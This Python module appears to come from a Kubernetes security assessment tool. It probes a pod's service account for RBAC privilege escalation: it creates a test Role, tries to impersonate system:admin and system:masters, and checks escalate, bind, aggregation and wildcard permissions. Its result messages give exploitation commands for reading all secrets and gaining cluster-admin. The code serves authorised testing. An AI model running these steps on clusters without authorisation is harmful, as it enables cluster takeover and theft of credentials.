"""
RBAC Escalation Checker

Comprehensive checks for privilege escalation via RBAC including:
- Direct RBAC manipulation (create/bind roles)
- Impersonation abuse
- Aggregated roles exploitation
- Wildcard permission abuse
- Self-subject review exploitation
- Service account escalation
- Namespace admin escalation
"""

import os
import json
import asyncio
from typing import Dict, List, Any, Optional
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


# Known dangerous RBAC verbs that can lead to privilege escalation
DANGEROUS_VERBS = {
    "create": ["rolebindings", "clusterrolebindings", "roles", "clusterroles", "serviceaccounts", "secrets", "pods"],
    "update": ["rolebindings", "clusterrolebindings", "roles", "clusterroles", "pods"],
    "patch": ["rolebindings", "clusterrolebindings", "roles", "clusterroles", "pods"],
    "delete": ["rolebindings", "clusterrolebindings"],
    "escalate": ["roles", "clusterroles"],
    "bind": ["roles", "clusterroles"],
    "impersonate": ["users", "groups", "serviceaccounts"],
}

# RBAC bypass techniques
RBAC_BYPASS_TECHNIQUES = {
    "impersonation": {
        "description": "Impersonate higher-privileged users/groups/service accounts",
        "dangerous_verbs": ["impersonate"],
        "resources": ["users", "groups", "serviceaccounts", "uids"],
        "api_groups": [""],
        "severity": "critical",
        "mitre": "T1078.004",
    },
    "self_subject_review": {
        "description": "Abuse SelfSubjectAccessReview to enumerate permissions",
        "dangerous_verbs": ["create"],
        "resources": ["selfsubjectaccessreviews", "selfsubjectrulesreviews"],
        "api_groups": ["authorization.k8s.io"],
        "severity": "medium",
        "mitre": "T1087",
    },
    "escalate_verb": {
        "description": "Use 'escalate' verb to grant higher permissions than own",
        "dangerous_verbs": ["escalate"],
        "resources": ["roles", "clusterroles"],
        "api_groups": ["rbac.authorization.k8s.io"],
        "severity": "critical",
        "mitre": "T1078",
    },
    "bind_verb": {
        "description": "Use 'bind' verb to bind any role without having its permissions",
        "dangerous_verbs": ["bind"],
        "resources": ["roles", "clusterroles"],
        "api_groups": ["rbac.authorization.k8s.io"],
        "severity": "critical",
        "mitre": "T1078",
    },
    "wildcard_resources": {
        "description": "Wildcard (*) on resources allows access to all resources",
        "dangerous_verbs": ["*"],
        "resources": ["*"],
        "api_groups": ["*"],
        "severity": "critical",
        "mitre": "T1078",
    },
    "create_pod_controller": {
        "description": "Create pods/deployments/daemonsets to run privileged workloads",
        "dangerous_verbs": ["create", "update", "patch"],
        "resources": ["pods", "deployments", "daemonsets", "replicasets", "statefulsets", "jobs", "cronjobs"],
        "api_groups": ["", "apps", "batch"],
        "severity": "high",
        "mitre": "T1610",
    },
    "create_persistent_volume": {
        "description": "Create PVs with hostPath to access host filesystem",
        "dangerous_verbs": ["create"],
        "resources": ["persistentvolumes", "persistentvolumeclaims"],
        "api_groups": [""],
        "severity": "high",
        "mitre": "T1611",
    },
    "modify_webhooks": {
        "description": "Modify admission webhooks to bypass security controls",
        "dangerous_verbs": ["create", "update", "patch", "delete"],
        "resources": ["validatingwebhookconfigurations", "mutatingwebhookconfigurations"],
        "api_groups": ["admissionregistration.k8s.io"],
        "severity": "critical",
        "mitre": "T1562",
    },
    "exec_attach": {
        "description": "Exec/attach to pods to access their credentials and data",
        "dangerous_verbs": ["create"],
        "resources": ["pods/exec", "pods/attach"],
        "api_groups": [""],
        "severity": "high",
        "mitre": "T1609",
    },
    "portforward_proxy": {
        "description": "Port-forward to access internal services",
        "dangerous_verbs": ["create"],
        "resources": ["pods/portforward", "services/proxy", "nodes/proxy"],
        "api_groups": [""],
        "severity": "medium",
        "mitre": "T1090",
    },
    "secrets_access": {
        "description": "Access secrets containing credentials",
        "dangerous_verbs": ["get", "list", "watch"],
        "resources": ["secrets"],
        "api_groups": [""],
        "severity": "high",
        "mitre": "T1552.007",
    },
    "token_request": {
        "description": "Create service account tokens",
        "dangerous_verbs": ["create"],
        "resources": ["serviceaccounts/token"],
        "api_groups": [""],
        "severity": "high",
        "mitre": "T1078.004",
    },
    "csr_approval": {
        "description": "Approve CSRs to issue certificates",
        "dangerous_verbs": ["update", "patch"],
        "resources": ["certificatesigningrequests/approval"],
        "api_groups": ["certificates.k8s.io"],
        "severity": "high",
        "mitre": "T1552",
    },
    "aggregated_roles": {
        "description": "Abuse aggregated ClusterRoles to gain permissions",
        "dangerous_verbs": ["create", "update"],
        "resources": ["clusterroles"],
        "api_groups": ["rbac.authorization.k8s.io"],
        "severity": "high",
        "mitre": "T1078",
        "check": "aggregationRule.clusterRoleSelectors",
    },
}


class RBACEscalationChecker:
    """Checks RBAC privilege escalation possibilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking possibilities of privilege escalation via RBAC."""
        try:
            # Checking for token presence and permissions on creation/viewing resources
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='rbac_escalation',
                    status='not_found',
                    message='Service account token not found.'
                )
            
            # Getting token and namespace
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
            namespace = (await asyncio.to_thread(lambda: open("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "r").read())).strip()
            
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Checking access to roles and role bindings
            curl_cmd = [
                'curl', '-s',
                f'https://{api_server}:{api_port}/apis/rbac.authorization.k8s.io/v1/namespaces/{namespace}/rolebindings',
                '--header', f'Authorization: Bearer {token}',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
            ]
            
            rb_rc, rb_out, _ = await run_exec(curl_cmd, timeout=5)
            
            # Checking access to ClusterRoles (cluster resources)
            curl_cmd = [
                'curl', '-s',
                f'https://{api_server}:{api_port}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings',
                '--header', f'Authorization: Bearer {token}',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
            ]
            
            crb_rc, crb_out, _ = await run_exec(curl_cmd, timeout=5)
            
            # Checking possibilities of creating roles
            create_role_cmd = [
                'curl', '-s', '-X', 'POST',
                f'https://{api_server}:{api_port}/apis/rbac.authorization.k8s.io/v1/namespaces/{namespace}/roles',
                '--header', f'Authorization: Bearer {token}',
                '--header', 'Content-Type: application/json',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '--data', json.dumps({
                    "apiVersion": "rbac.authorization.k8s.io/v1",
                    "kind": "Role",
                    "metadata": {
                        "name": "test-escalation-role"
                    },
                    "rules": [
                        {
                            "apiGroups": [""],
                            "resources": ["pods"],
                            "verbs": ["get", "list"]
                        }
                    ]
                })
            ]
            
            create_rc, create_out, _ = await run_exec(create_role_cmd, timeout=5)
            
            # Checking results and determining status
            can_view_rolebindings = rb_rc == 0 and "items" in rb_out
            can_view_clusterrolebindings = crb_rc == 0 and "items" in crb_out
            can_create_roles = create_rc == 0 and "Forbidden" not in create_out
            
            escalation_paths = []
            if can_view_rolebindings:
                escalation_paths.append("Access to view RoleBindings")
            if can_view_clusterrolebindings:
                escalation_paths.append("Access to view ClusterRoleBindings")
            if can_create_roles:
                escalation_paths.append("Possibility of creating new roles")
            
            if escalation_paths:
                # Trying to find high-privilege bindings for current SA
                if can_view_rolebindings and "items" in rb_out:
                    try:
                        rb_data = json.loads(rb_out)
                        privileged_bindings = []
                        
                        for binding in rb_data.get("items", []):
                            role_name = binding.get("roleRef", {}).get("name", "")
                            subjects = binding.get("subjects", [])
                            
                            # Checking for privileged roles
                            if role_name in ["admin", "edit", "cluster-admin"]:
                                for subject in subjects:
                                    if subject.get("namespace", "") == namespace:
                                        privileged_bindings.append(
                                            f"RoleBinding: {binding['metadata']['name']} -> {role_name}"
                                        )
                        
                        if privileged_bindings:
                            escalation_paths.append(
                                f"Detected privileged bindings: {', '.join(privileged_bindings)}"
                            )
                    except Exception:
                        pass
                
                demo_next = "Detected permissions allow privilege escalation: create roles, bindings, possibly get access to admin rights."
                return EscapeAttemptResult(
                    method='rbac_escalation',
                    status='exploited',
                    message=f'Detected potential privilege escalation paths via RBAC: {", ".join(escalation_paths)}.',
                    artifact_content=rb_out[:300] if can_view_rolebindings else None,
                    demo_next_steps=demo_next
                )
            
            return EscapeAttemptResult(
                method='rbac_escalation',
                status='no_escalation',
                message='No possibilities detected for privilege escalation via RBAC.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='rbac_escalation', status='error', message=str(e))
    
    async def check_impersonation(self) -> EscapeAttemptResult:
        """Check for impersonation privileges which allow assuming other identities."""
        try:
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='rbac_impersonation',
                    status='not_found',
                    message='Service account token not found.'
                )
            
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
            
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Test impersonation by trying to list pods as system:admin
            impersonate_targets = [
                ("User", "system:admin"),
                ("User", "cluster-admin"),
                ("Group", "system:masters"),
                ("ServiceAccount", "system:serviceaccount:kube-system:default"),
            ]
            
            successful_impersonations = []
            
            for kind, target in impersonate_targets:
                curl_cmd = [
                    'curl', '-s',
                    f'https://{api_server}:{api_port}/api/v1/namespaces',
                    '--header', f'Authorization: Bearer {token}',
                    '--header', f'Impersonate-{kind}: {target}',
                    '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                    '-o', '/dev/null', '-w', '%{http_code}'
                ]
                
                _, out, _ = await run_exec(curl_cmd, timeout=5)
                if out.strip() in ['200', '201']:
                    successful_impersonations.append(f"{kind}:{target}")
            
            if successful_impersonations:
                return EscapeAttemptResult(
                    method='rbac_impersonation',
                    status='exploited',
                    message=f'Can impersonate: {", ".join(successful_impersonations)}',
                    demo_next_steps=f"""Impersonation allows assuming the identity of privileged users/groups.
This can be exploited with:
kubectl --as=system:admin get secrets -A
kubectl --as-group=system:masters get nodes

Successful impersonation targets: {successful_impersonations}"""
                )
            
            return EscapeAttemptResult(
                method='rbac_impersonation',
                status='no_escalation',
                message='No impersonation privileges detected.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='rbac_impersonation', status='error', message=str(e))
    
    async def check_escalate_bind_verbs(self) -> EscapeAttemptResult:
        """Check for 'escalate' and 'bind' verbs on roles."""
        try:
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='rbac_escalate_bind',
                    status='not_found',
                    message='Service account token not found.'
                )
            
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
            
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Check SelfSubjectAccessReview for escalate/bind verbs
            checks = [
                {
                    "verb": "escalate",
                    "resource": "clusterroles",
                    "apiGroup": "rbac.authorization.k8s.io",
                },
                {
                    "verb": "bind",
                    "resource": "clusterroles",
                    "apiGroup": "rbac.authorization.k8s.io",
                },
                {
                    "verb": "escalate",
                    "resource": "roles",
                    "apiGroup": "rbac.authorization.k8s.io",
                },
                {
                    "verb": "bind",
                    "resource": "roles",
                    "apiGroup": "rbac.authorization.k8s.io",
                },
            ]
            
            escalation_verbs = []
            
            for check in checks:
                review_payload = {
                    "apiVersion": "authorization.k8s.io/v1",
                    "kind": "SelfSubjectAccessReview",
                    "spec": {
                        "resourceAttributes": {
                            "verb": check["verb"],
                            "group": check["apiGroup"],
                            "resource": check["resource"],
                        }
                    }
                }
                
                curl_cmd = [
                    'curl', '-s', '-X', 'POST',
                    f'https://{api_server}:{api_port}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',
                    '--header', f'Authorization: Bearer {token}',
                    '--header', 'Content-Type: application/json',
                    '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                    '--data', json.dumps(review_payload)
                ]
                
                _, out, _ = await run_exec(curl_cmd, timeout=5)
                
                try:
                    review_result = json.loads(out)
                    if review_result.get("status", {}).get("allowed", False):
                        escalation_verbs.append(f"{check['verb']} on {check['resource']}")
                except json.JSONDecodeError:
                    pass
            
            if escalation_verbs:
                return EscapeAttemptResult(
                    method='rbac_escalate_bind',
                    status='exploited',
                    message=f'Dangerous RBAC verbs available: {", ".join(escalation_verbs)}',
                    demo_next_steps=f"""The 'escalate' and 'bind' verbs allow privilege escalation:

- 'escalate': Create roles with more permissions than you have
- 'bind': Bind any role without having its permissions

Available: {escalation_verbs}

Example exploitation:
1. Create a ClusterRole with cluster-admin permissions
2. Bind it to your service account
3. Full cluster access achieved"""
                )
            
            return EscapeAttemptResult(
                method='rbac_escalate_bind',
                status='no_escalation',
                message='No escalate/bind privileges detected.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='rbac_escalate_bind', status='error', message=str(e))
    
    async def check_aggregated_roles(self) -> EscapeAttemptResult:
        """Check for ability to abuse aggregated ClusterRoles."""
        try:
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='rbac_aggregation',
                    status='not_found',
                    message='Service account token not found.'
                )
            
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
            
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Get all ClusterRoles
            curl_cmd = [
                'curl', '-s',
                f'https://{api_server}:{api_port}/apis/rbac.authorization.k8s.io/v1/clusterroles',
                '--header', f'Authorization: Bearer {token}',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
            ]
            
            _, out, _ = await run_exec(curl_cmd, timeout=10)
            
            try:
                roles_data = json.loads(out)
                aggregated_roles = []
                exploitable_labels = []
                
                for role in roles_data.get("items", []):
                    # Check if role uses aggregation
                    aggregation_rule = role.get("aggregationRule")
                    if aggregation_rule:
                        selectors = aggregation_rule.get("clusterRoleSelectors", [])
                        for selector in selectors:
                            match_labels = selector.get("matchLabels", {})
                            if match_labels:
                                aggregated_roles.append(role["metadata"]["name"])
                                for label_key, label_value in match_labels.items():
                                    exploitable_labels.append(f"{label_key}={label_value}")
                
                if aggregated_roles:
                    # Check if we can create ClusterRoles
                    review_payload = {
                        "apiVersion": "authorization.k8s.io/v1",
                        "kind": "SelfSubjectAccessReview",
                        "spec": {
                            "resourceAttributes": {
                                "verb": "create",
                                "group": "rbac.authorization.k8s.io",
                                "resource": "clusterroles",
                            }
                        }
                    }
                    
                    curl_cmd = [
                        'curl', '-s', '-X', 'POST',
                        f'https://{api_server}:{api_port}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',
                        '--header', f'Authorization: Bearer {token}',
                        '--header', 'Content-Type: application/json',
                        '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                        '--data', json.dumps(review_payload)
                    ]
                    
                    _, review_out, _ = await run_exec(curl_cmd, timeout=5)
                    
                    try:
                        review_data = json.loads(review_out)
                        can_create = review_data.get("status", {}).get("allowed", False)
                        
                        if can_create:
                            return EscapeAttemptResult(
                                method='rbac_aggregation',
                                status='exploited',
                                message=f'Can exploit aggregated roles: {aggregated_roles[:5]}',
                                demo_next_steps=f"""Aggregated ClusterRoles can be exploited:

Aggregated roles found: {aggregated_roles[:5]}
Target labels: {set(exploitable_labels)}

Exploitation:
1. Create a ClusterRole with matching labels
2. Add dangerous permissions to your role
3. Permissions automatically aggregate into target role

Example:
kubectl create clusterrole exploit-role --verb=* --resource=secrets \\
  --dry-run=client -o yaml | \\
  kubectl label -f - --local -o yaml {exploitable_labels[0] if exploitable_labels else 'rbac.example.com/aggregate-to-admin=true'} | \\
  kubectl apply -f -"""
                            )
                    except json.JSONDecodeError:
                        pass
                    
                    return EscapeAttemptResult(
                        method='rbac_aggregation',
                        status='detected',
                        message=f'Aggregated roles found but cannot create ClusterRoles: {aggregated_roles[:5]}'
                    )
            except json.JSONDecodeError:
                pass
            
            return EscapeAttemptResult(
                method='rbac_aggregation',
                status='no_escalation',
                message='No exploitable aggregated roles detected.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='rbac_aggregation', status='error', message=str(e))
    
    async def check_wildcard_permissions(self) -> EscapeAttemptResult:
        """Check for wildcard (*) permissions that may allow escalation."""
        try:
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='rbac_wildcard',
                    status='not_found',
                    message='Service account token not found.'
                )
            
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
            namespace = (await asyncio.to_thread(lambda: open("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "r").read())).strip()
            
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Get SelfSubjectRulesReview to see all permissions
            review_payload = {
                "apiVersion": "authorization.k8s.io/v1",
                "kind": "SelfSubjectRulesReview",
                "spec": {
                    "namespace": namespace
                }
            }
            
            curl_cmd = [
                'curl', '-s', '-X', 'POST',
                f'https://{api_server}:{api_port}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
                '--header', f'Authorization: Bearer {token}',
                '--header', 'Content-Type: application/json',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '--data', json.dumps(review_payload)
            ]
            
            _, out, _ = await run_exec(curl_cmd, timeout=10)
            
            try:
                rules_data = json.loads(out)
                resource_rules = rules_data.get("status", {}).get("resourceRules", [])
                
                wildcard_permissions = []
                dangerous_permissions = []
                
                for rule in resource_rules:
                    verbs = rule.get("verbs", [])
                    resources = rule.get("resources", [])
                    api_groups = rule.get("apiGroups", [""])
                    
                    # Check for wildcards
                    if "*" in verbs or "*" in resources:
                        wildcard_permissions.append({
                            "verbs": verbs,
                            "resources": resources,
                            "apiGroups": api_groups
                        })
                    
                    # Check for dangerous permissions
                    for verb in verbs:
                        if verb in DANGEROUS_VERBS:
                            for resource in resources:
                                if resource in DANGEROUS_VERBS.get(verb, []) or resource == "*":
                                    dangerous_permissions.append(f"{verb} on {resource}")
                
                if wildcard_permissions:
                    return EscapeAttemptResult(
                        method='rbac_wildcard',
                        status='exploited',
                        message=f'Wildcard permissions detected! {len(wildcard_permissions)} wildcard rules found.',
                        demo_next_steps=f"""Wildcard permissions allow broad access:

Wildcard rules: {wildcard_permissions[:3]}
Dangerous permissions: {list(set(dangerous_permissions))[:10]}

This may allow:
- Access to all resources in namespace/cluster
- Creating privileged pods
- Reading all secrets
- Modifying RBAC"""
                    )
                elif dangerous_permissions:
                    return EscapeAttemptResult(
                        method='rbac_wildcard',
                        status='detected',
                        message=f'Dangerous permissions found: {list(set(dangerous_permissions))[:10]}'
                    )
            except json.JSONDecodeError:
                pass
            
            return EscapeAttemptResult(
                method='rbac_wildcard',
                status='no_escalation',
                message='No wildcard or dangerous permissions detected.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='rbac_wildcard', status='error', message=str(e))
    
    def check_all(self) -> List[EscapeAttemptResult]:
        """Run all RBAC escalation checks."""
        return [
            self.check(),
            self.check_impersonation(),
            self.check_escalate_bind_verbs(),
            self.check_aggregated_roles(),
            self.check_wildcard_permissions(),
        ]

